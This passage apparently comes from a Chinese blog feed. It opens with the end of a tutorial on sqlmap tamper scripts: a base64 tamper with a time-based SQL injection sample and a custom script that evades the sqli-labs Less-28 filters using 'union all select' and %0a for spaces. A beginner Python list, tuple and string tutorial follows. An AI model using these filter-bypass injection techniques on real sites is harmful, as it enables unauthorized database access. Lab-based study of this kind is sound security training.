python#这部分是头部声明，paython文件的声明</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file 'LICENSE' for copying permission</span></span><br><span class="line"><span class="string">"""</span><span class="comment">#这部分是注释说明，关于sqlmap的说明</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64<span class="comment">#这里是需要用到的第三方库的引入</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.settings <span class="keyword">import</span> UNICODE_ENCODING</span><br><span class="line"><span class="comment">#这部分是sqlmap内部调用，基本不变</span></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Base64-encodes all characters in a given payload</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper("1' AND SLEEP(5)#")</span></span><br><span class="line"><span class="string">    'MScgQU5EIFNMRUVQKDUpIw=='</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(payload.encode(UNICODE_ENCODING)) <span class="keyword">if</span> payload <span class="keyword">else</span> payload</span><br><span class="line"><span class="comment">#这部分就是重点内容，payload的代码</span></span><br></pre></td></tr></table></figure><p>以sqli-labs/Less_28为编写示列：已知此场景对 /、 *、 -、 #、 space(空格)、 +、 union\s+select进行了过滤处理，对此编写脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file 'LICENSE' for copying permission</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.settings <span class="keyword">import</span> UNICODE_ENCODING</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Bypass sqli-lab/Less-28 </span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"><span class="keyword">if</span> payload:</span><br><span class="line">        payload = payload.replace(<span class="string">'union select'</span>,<span class="string">'union all select'</span>).replace(<span class="string">' '</span>,<span class="string">'%0a'</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><blockquote><p>参考： <a href="https://mooc.study.163.com/smartSpec/detail/1001386007.htm" target="_blank" rel="noopener" title="With a Title">web安全工程师（进阶）-网易云课堂</a>. </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 注入 </tag>
            
            <tag> sqlmap </tag>
            
            <tag> bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python列表元组字符串相关操作</title>
      <link href="/2019/12/20/pycaozuo/"/>
      <url>/2019/12/20/pycaozuo/</url>
      
        <content type="html"><![CDATA[<h1 id="List操作"><a href="#List操作" class="headerlink" title="List操作"></a>List操作</h1><h3 id="列表方法"><a href="#列表方法" class="headerlink" title="*列表方法"></a>*列表方法</h3><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>append()</td><td>在列表的末尾添加一个元素</td></tr><tr><td>clear()</td><td>删除列表中的所有元素</td></tr><tr><td>copy()</td><td>返回列表的副本</td></tr><tr><td>count()</td><td>返回具有指定值的元素数量。</td></tr><tr><td>extend()</td><td>将列表元素（或任何可迭代的元素）添加到当前列表的末尾</td></tr><tr><td>index()</td><td>返回具有指定值的第一个元素的索引</td></tr><tr><td>insert()</td><td>在指定位置添加元素</td></tr><tr><td>pop()</td><td>删除指定位置的元素</td></tr><tr><td>remove()</td><td>删除具有指定值的项目</td></tr><tr><td>reverse()</td><td>颠倒列表的顺序</td></tr><tr><td>sort()</td><td>对列表进行排序</td></tr></tbody></table><h3 id="操作解释"><a href="#操作解释" class="headerlink" title="*操作解释"></a>*操作解释</h3><h4 id="一、添加元素（扩展列表）"><a href="#一、添加元素（扩展列表）" class="headerlink" title="一、添加元素（扩展列表）"></a>一、添加元素（扩展列表）</h4><ol><li>append()<br>（1）元素追加</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>member = [<span class="number">1</span>,<span class="number">2</span>,<span class="string">'a'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member.append(<span class="string">'b'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="string">'a'</span>, <span class="string">'b'</span>]</span><br><span class="line">&gt;&gt;&gt;&gt;&gt;&gt; member = [<span class="number">1</span>,<span class="number">2</span>,<span class="string">'a'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member.append(<span class="string">'b'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="string">'a'</span>, <span class="string">'b'</span>]</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p> （2）列表追加</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 extend() 方法将 list2 添加到 list1 的末尾：</span></span><br><span class="line"></span><br><span class="line">list1 = [<span class="string">"a"</span>, <span class="string">"b"</span> , <span class="string">"c"</span>]</span><br><span class="line">list2 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">list1.extend(list2)</span><br><span class="line">print(list1)</span><br><span class="line"></span><br><span class="line">[<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br></pre></td></tr></table></figure><ol start="2"><li>extend()<br>（1）元素追加</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加单个元素：</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member=[<span class="number">1</span>, <span class="number">2</span>, <span class="string">'a'</span>, <span class="string">'b'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="string">'a'</span>, <span class="string">'b'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member.extend(<span class="string">'s'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'s'</span>]</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加的对象必须是可迭代序列:</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="string">'a'</span>, <span class="string">'b'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member.extend(<span class="number">5</span>)  </span><br><span class="line">Traceback (most recent call last):</span><br><span class="line"> File <span class="string">"&lt;pyshell#3&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line"> member.extend(<span class="number">5</span>)</span><br><span class="line">TypeError: <span class="string">'int'</span> object <span class="keyword">is</span> <span class="keyword">not</span> iterable</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可用如下方法添加：</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member.extend([<span class="number">5</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="number">5</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"></span><br><span class="line"> <span class="comment"># 添加两个元素会报错:</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member.extend(<span class="string">'a'</span>,<span class="string">'b'</span>)   </span><br><span class="line">Traceback (most recent call last):</span><br><span class="line"> File <span class="string">"&lt;pyshell#6&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line"> member.extend(<span class="string">'a'</span>,<span class="string">'b'</span>)</span><br><span class="line">TypeError: extend() takes exactly one argument (<span class="number">2</span> given)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member.extend([<span class="string">'a'</span><span class="string">'b'</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'s'</span>, <span class="string">'ab'</span>]</span><br></pre></td></tr></table></figure><p>  （2）列表追加</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>list1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list2 = [<span class="number">12</span>,<span class="number">6</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list1.extend(list2)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(list1)</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">6</span>]</span><br></pre></td></tr></table></figure><ol start="3"><li>insert()</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>member.insert(<span class="number">1</span>,<span class="string">'ss'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member</span><br><span class="line">[<span class="number">1</span>, <span class="string">'ss'</span>, <span class="number">2</span>, <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'s'</span>, <span class="string">'a'</span>, <span class="string">'b'</span>]</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><ol start="4"><li>+运算 #两个列表的拼接（不可＋元素）</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s2 = [<span class="number">4</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(s1+s2)</span><br><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br></pre></td></tr></table></figure><p>#Extend是把每个元素都作为一个独立的元素扩充到原来的列表，而append则是把整个扩充列表作为一个元素追加到列表最后。</p><h4 id="二、删除元素"><a href="#二、删除元素" class="headerlink" title="二、删除元素"></a>二、删除元素</h4><ol><li>remove(i) # i为要移除的对象</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>member=[<span class="number">1</span>,<span class="number">2</span>,<span class="string">'a'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="string">'a'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member.remove(<span class="number">1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member</span><br><span class="line"><span class="comment">#### [2, 'a']</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li>pop() #可指定删除某项，默认删除末尾元素，删除某个元素时返回这个元素的值</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>member=[<span class="number">1</span>,<span class="number">2</span>,<span class="string">'a'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member.pop()</span><br><span class="line"><span class="string">'a'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member.pop(<span class="number">0</span>)</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member</span><br><span class="line">[<span class="number">2</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>name = member.pop()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>name</span><br><span class="line"><span class="number">2</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><ol start="3"><li>clear() # 清空列表的元素（类似于 del a[:]）</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>member</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="number">5</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member.clear()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member</span><br><span class="line">[]</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><ol start="4"><li>del  #删除列表</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> member</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;pyshell#6&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    member</span><br><span class="line">NameError: name <span class="string">'member'</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h4 id="三、列表复制"><a href="#三、列表复制" class="headerlink" title="三、列表复制"></a>三、列表复制</h4><ol><li>copy() </li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">thislist = [<span class="string">"apple"</span>, <span class="string">"banana"</span>, <span class="string">"cherry"</span>]</span><br><span class="line">mylist = thislist.copy()</span><br><span class="line">print(mylist)</span><br><span class="line"></span><br><span class="line">[<span class="string">"apple"</span>, <span class="string">"banana"</span>, <span class="string">"cherry"</span>]</span><br></pre></td></tr></table></figure><h4 id="四、计数、排序、统计"><a href="#四、计数、排序、统计" class="headerlink" title="四、计数、排序、统计"></a>四、计数、排序、统计</h4><ol><li>count() #  统计某项出现的次数</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>L=[<span class="string">'s'</span>,<span class="string">'s'</span>,<span class="string">'a'</span>,<span class="string">'s'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>L.count(<span class="string">'s'</span>)</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure><ol start="2"><li>index()  # 从列表中找出某个值第一个匹配项的索引位置，返回</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>L</span><br><span class="line">[<span class="string">'s'</span>, <span class="string">'s'</span>, <span class="string">'a'</span>, <span class="string">'s'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>L.index(<span class="string">'a'</span>)</span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure><h4 id="四、关系操作"><a href="#四、关系操作" class="headerlink" title="四、关系操作"></a>四、关系操作</h4><ol><li>大小比较（比较第一个元素的ASCII值）</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>list1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list2 = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list1 &lt; list2</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list3 = [<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list1 &gt; list3</span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>(list1 &lt; list2) <span class="keyword">and</span> (list1 &lt; list3)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li>关系判断（判断元素是否属于此列表）</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>list1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">1</span> <span class="keyword">in</span> list1</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">4</span> <span class="keyword">in</span> list1</span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">2</span> <span class="keyword">not</span> <span class="keyword">in</span> list1</span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 列表内嵌列表的元素的索引与判断：</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list1 = [<span class="number">1</span>,<span class="number">2</span>,[<span class="number">3</span>,<span class="number">4</span>],<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">3</span> <span class="keyword">in</span> list1</span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">3</span> <span class="keyword">in</span> list1[<span class="number">2</span>]</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list1[<span class="number">2</span>][<span class="number">0</span>]</span><br><span class="line"><span class="number">3</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><ol start="3"><li>* #重复操作</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>list1 = [<span class="number">123</span>,<span class="number">456</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list1*<span class="number">3</span></span><br><span class="line">[<span class="number">123</span>, <span class="number">456</span>, <span class="number">123</span>, <span class="number">456</span>, <span class="number">123</span>, <span class="number">456</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list1 *=<span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list1</span><br><span class="line">[<span class="number">123</span>, <span class="number">456</span>, <span class="number">123</span>, <span class="number">456</span>, <span class="number">123</span>, <span class="number">456</span>]</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><ol start="4"><li>reveres #将列表元素倒叙排列</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>list1</span><br><span class="line">[<span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list1.reverse()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list1</span><br><span class="line">[<span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>]</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><ol start="5"><li>sort（）#默认正序排序</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>list1</span><br><span class="line">[<span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list1.sort()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list1</span><br><span class="line">[<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list1.sort(reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list1</span><br><span class="line">[<span class="number">3</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>list2=list1 #list2与list1共用一个地址<br>list2=list1[:] #两个元素相同的列表</p><h1 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h1><p>创建单个元素或需要加逗号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>temp=(<span class="number">1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>type(temp)</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">int</span>'&gt;</span></span><br><span class="line">&gt;&gt;&gt; temp2=(1,)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>temp3=()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>type(temp2)</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">tuple</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">type</span><span class="params">(temp3)</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> '<span class="title">tuple</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt;</span></span><br></pre></td></tr></table></figure><p>逗号是标识元组的关键标识（不加括号有逗号也可以创建元组）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>temp=<span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>type(temp)</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">tuple</span>'&gt;</span></span><br></pre></td></tr></table></figure><h2 id="元组操作"><a href="#元组操作" class="headerlink" title="元组操作"></a>元组操作</h2><ol><li>*重复操作</li><li>del删除</li><li>+拼接操作</li><li>&lt; &gt; =关系操作</li><li>in  ,not in成员操作 （可用切片法更新元组）</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>temp=(<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>temp=temp[:<span class="number">1</span>]+(<span class="number">3</span>,)+temp[<span class="number">1</span>:]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>temp</span><br><span class="line">(<span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">4</span>)</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h1 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h1><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>capitalize()</td><td>把字符串的第一个字符改为大写</td></tr><tr><td>casefold()</td><td>把整个字符串的所有字符改为小写</td></tr><tr><td>center(width)</td><td>将字符串居中，并使用空格填充至长度 width 的新字符串</td></tr><tr><td>count(sub[, start[, end]])</td><td>返回 sub 在字符串里边出现的次数，start 和 end 参数表示范围，可选。</td></tr><tr><td>encode(encoding=’utf-8’, errors=’strict’)</td><td>以 encoding 